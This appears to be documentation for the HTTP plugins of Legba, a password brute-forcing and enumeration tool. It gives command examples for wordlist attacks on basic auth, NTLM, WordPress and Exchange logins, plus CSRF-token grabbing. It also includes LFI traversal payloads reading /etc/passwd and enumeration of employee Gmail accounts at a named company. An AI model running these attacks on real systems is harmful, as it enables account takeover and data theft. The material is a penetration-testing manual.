A set of plugins supporting http basic authentication, NTLMv1, NTLMv2, multipart form requests, standard HTTP requests, CSRF token grabbing and HTTP pages enumeration.

| Name | Description |
| ---- | ----------- |
| http       | HTTP request. |
| http.basic | HTTP basic authentication. |
| http.enum  | HTTP pages enumeration. |
| http.form  | HTTP multipart form request. |
| http.ntlm1 | NTLMv1 authentication over HTTP. |
| http.ntlm2 | NTLMv2 authentication over HTTP. |
| http.vhost | HTTP virtual host enumeration. |

## Options

| Name | Description |
| ---- | ----------- | 
| `--http-success-codes <HTTP_SUCCESS_CODES>` | Comma separated status codes to consider as successful authentication attempts for HTTP based plugins [default: "200, 301, 302"] |
| `--http-random-ua` | Randomize requests User-Agent |
| `--http-success-string <HTTP_SUCCESS_STRING>` | Check for the presence of this string in the response in order to recognize a succesful attempt |
| `--http-failure-string <HTTP_FAILURE_STRING>` | Check for the presence of this string in the response in order to recognize a failed attempt |
| `--http-follow-redirects` | Follow HTTP redirects |
| `--http-method <HTTP_METHOD>` | Request method for HTTP based plugins [default: `GET`] |
| `--http-headers <HTTP_HEADERS>...` | Request headers for HTTP based plugins |
| `--http-csrf-page <HTTP_CSRF_PAGE>` | For each request grab a CSRF token from this page |
| `--http-csrf-regexp <HTTP_CSRF_REGEXP>` | Regular expression to use to grab the CSRF token name and value [default: `"<input type=\"hidden\" name=\"(token)\" value=\"([^\"]+)\""`] |
| `--http-payload <HTTP_PAYLOAD>` | Request payload (query string, post body or form data) for HTTP based plugins |
| `--http-enum-ext <HTTP_ENUM_EXT>` | File extension for HTTP enumeration [default: `php`] |
| `--http-enum-ext-placeholder <HTTP_ENUM_EXT_PLACEHOLDER>` | File extension placeholder for HTTP enumeration wordlist [default: `%EXT%`] |
| `--http-ntlm-domain <HTTP_NTLM_DOMAIN>` | Domain for NTLM authentication over HTTP |
| `--http-ntlm-workstation <HTTP_NTLM_WORKSTATION>` | Workstation name for NTLM authentication over HTTP [default: `CLIENT`] |
| `--proxy <PROXY>` | Proxy URL |
| `--proxy-auth <PROXY_AUTH>` | Proxy authentication as username:password |

## Examples

### Basic Authentication

HTTP Basic Authentication

```sh
legba http.basic \
    --username admin \
    --password wordlists/passwords.txt \
    --target http://localhost:8888/
```

### NTLM Authentication

HTTP Request with NTLMv1 Authentication:

```sh
legba http.ntlm1 \
    --domain example.org \
    --workstation client \
    --username admin \
    --password wordlists/passwords.txt \
    --target https://localhost:8888/
```

HTTP Request with NTLMv2 Authentication:

```sh
legba http.ntlm2 \
    --domain example.org \
    --workstation client \
    --username admin \
    --password wordlists/passwords.txt \
    --target https://localhost:8888/
```

Targeting an example Microsoft Exchange server via NTLMv2:

```sh
legba http.ntlm2 \
    --http-ntlm-domain LEGBA \
    --username jeff \
    --password wordlists/passwords.txt \
    -T "https://exchange-server/ews" \
    --http-success-codes "200, 500"
```

### Enumeration

HTTP Pages Enumeration:
 
```sh
legba http.enum \
    --payloads data/pages.txt \
    --target http://localhost:8888/ \
    --http-enum-ext php \ # php is the default value for file extensions
    --http-success-codes 200 
```

Wordpress plugin discovery using interpolation syntax:
 
```sh
legba http.enum \
    --payloads data/wordpress-plugins.txt \
    --target http://localhost:8888/wp-content/plugins/{PAYLOAD}/readme.txt \
    --http-success-codes 200 
```

LFI vulnerability fuzzing:

```sh
legba http.enum \
    --payloads data/lfi.txt \
    --target http://localhost:8888/ \
    --http-success-string "root:"
```

The `data/lfi.txt` would be something like:

```
?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
file?filename=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
...
... and so on ...
...
```

Google Suite / GMail valid accounts enumeration:

```sh
legba http.enum \
    --payloads data/employees-names.txt \
    --http-success-string "COMPASS" \
    --http-success-codes 204 \
    --quiet \
    --target "https://mail.google.com/mail/gxlu?email={PAYLOAD}@broadcom.com" 
```

### Misc HTTP Requests

HTTP Post Request (Wordpress wp-login.php page):

```sh
legba http \
    --username admin \
    --password wordlists/passwords.txt \
    --target http://localhost:8888/wp-login.php \
    --http-method POST \
    --http-success-codes 302 \ # wordpress redirects on successful login
    --http-payload 'log={USERNAME}&pwd={PASSWORD}'
```

HTTP Post Request (Wordpress xmlrpc.php)

```sh
legba http \
    --username admin \
    --password wordlists/passwords.txt \
    --target http://localhost:8888/xmlrpc.php \
    --http-method POST \
    --http-payload '<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{USERNAME}</string></value></param><param><value><string>{PASSWORD}</string></value></param></params></methodCall>' \
    --http-success-string 'isAdmin' # what string successful response will contain
```

Or using the @ syntax to load the payload from a file:

```sh
legba http \
    --username admin \
    --password wordlists/passwords.txt \
    --target http://localhost:8888/xmlrpc.php \
    --http-method POST \
    --http-payload @xmlrpc-payload.xml \
    --http-success-string 'isAdmin'
```

HTTP Post Request with CSRF Token grabbing:

```sh
legba http \
    --username admin \
    --password wordlists/passwords.txt \
    --target http://localhost:8888/ \
    --http-csrf-page http://localhost:8888/ \ # where to grab the CSRF token from, or empty if it's the same as --target
    --http-csrf-regexp '<input type="hidden" name="(token)" value="([^\"]+)"' \ # regular expression to extract it
    --http-method POST \
    --http-payload 'user={USERNAME}&pass={PASSWORD}'
```

Targeting an example Microsoft Exchange server via OWA:

```sh
legba http \
    --target "https://exchange-server/owa/auth.owa" \
    --username "LEGBA\jeff" \
    --password wordlists/passwords.txt \
    --http-method POST \
    --http-payload 'destination=https://exchange-server/&flags=4&username={USERNAME}&password={PASSWORD}' \
    --http-success-codes 302 \
    --http-success-string 'set-cookie'
```
